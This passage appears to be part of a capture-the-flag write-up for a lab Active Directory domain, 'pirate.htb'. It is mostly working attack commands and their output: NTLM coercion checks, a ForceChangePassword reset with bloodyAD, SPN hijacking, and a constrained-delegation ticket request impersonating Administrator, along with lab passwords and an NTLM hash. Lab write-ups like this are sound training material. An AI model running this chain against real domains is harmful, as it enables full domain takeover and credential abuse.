## Time and Date Synchronization

The scan flagged a clock skew of roughly seven hours. Since Kerberos is time-sensitive, the local clock needs to match the DC before ticket-based auth will work:

```shell
sudo /etc/init.d/virtualbox-guest-utils stop
sudo systemctl stop systemd-timesyncd
sudo net time set -S 10.129.17.202
```

## Privilege Escalation to SYSTEM on WEB01

### NTLM Relay

`DC01` enforces SMB signing; `WEB01` does not — making `WEB01` a relay target. `NetExec`'s coercion modules confirm both hosts are vulnerable to common coercion primitives (PetitPotam, PrinterBug, DFSCoerce, MSEven):

```shell
netexec smb WEB01.pirate.htb -u 'GMSA_ADFS_PROD$' -H 'fd9ea7ac7820dba5155bd6ed2d850c09' -M ntlm_reflection -M coerce_plus
```

## Privilege Escalation to SYSTEM on DC01

### ForceChangePassword Abuse

A fresh BloodHound view from `a.white`'s context shows **ForceChangePassword** rights over `a.white_adm`, an administrative account:

| Username | Password |
|---|---|
| `a.white` | `E2nvAOKSz5Xz2MJu` |

`bloodyAD` uses the right to reset `a.white_adm`'s password without knowing the original:

```shell
bloodyAD --host 10.129.17.202 -d pirate.htb -u a.white -p E2nvAOKSz5Xz2MJu set password 'a.white_adm' 'P@ssw0rd'
```

```
[+] Password changed successfully!
```

`a.white_adm` turns out to have **Constrained Delegation with Protocol Transition** configured for `http/WEB01.pirate.htb`:

```shell
netexec ldap DC01.pirate.htb -u 'a.white_adm' -p 'P@ssw0rd' --find-delegation
```

```
AccountName   AccountType   DelegationType                       DelegationRightsTo
-----------   -----------   ----------------------------------   -------------------
a.white_adm   Person        Constrained w/ Protocol Transition    http/WEB01.pirate.htb, HTTP/WEB01
WEB01$        Computer      Resource-Based Constrained            WEB01$
```

### SPN Hijacking

Constrained delegation is tied to a specific SPN, and SPNs must be unique across the whole forest. `WEB01` isn't the real target — `DC01` is — so the `HTTP/WEB01` SPN needs to move from `WEB01$` to `DC01$` to redirect the delegation there.

The `msldap` branch of `bloodyAD` handles the SPN move (an environment was built for it: `python3 -m virtualenv venv`, `pip3 install -r requirements.txt`). First, the SPN is removed from `WEB01$`:

```shell
python3 bloodyAD.py -H 10.129.17.202 -d pirate.htb -u a.white_adm -p 'P@ssw0rd' msldap delspn "CN=WEB01,CN=Computers,DC=pirate,DC=htb" "HTTP/WEB01.pirate.htb"
```

```
SPN removed!
```

Then added to `DC01$`:

```shell
python3 bloodyAD.py -H 10.129.17.202 -d pirate.htb -u a.white_adm -p 'P@ssw0rd' msldap addspn "CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb" "HTTP/WEB01.pirate.htb"
```

```
SPN added!
```

*(As a fallback, the standalone `addspn` tool works equally well for removing and re-adding the SPN.)*

Confirming the move:

```shell
bloodyAD --host 10.129.17.202 -d pirate.htb -u a.white_adm -p 'P@ssw0rd' get object 'DC01$' --attr servicePrincipalName
```

```
servicePrincipalName: HTTP/WEB01.pirate.htb; ... ldap/DC01.pirate.htb; ...
```

### KDC Abuse

With the hijacked SPN now living on `DC01$`, `impacket-getST` abuses `a.white_adm`'s constrained delegation to request a ticket impersonating `Administrator`, then swaps the target service to `CIFS/DC01.pirate.htb` via `-altservice`:

```shell
impacket-getST PIRATE.HTB/a.white_adm:'P@ssw0rd' -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip DC01.pirate.htb -altservice CIFS/DC01.pirate.htb
```
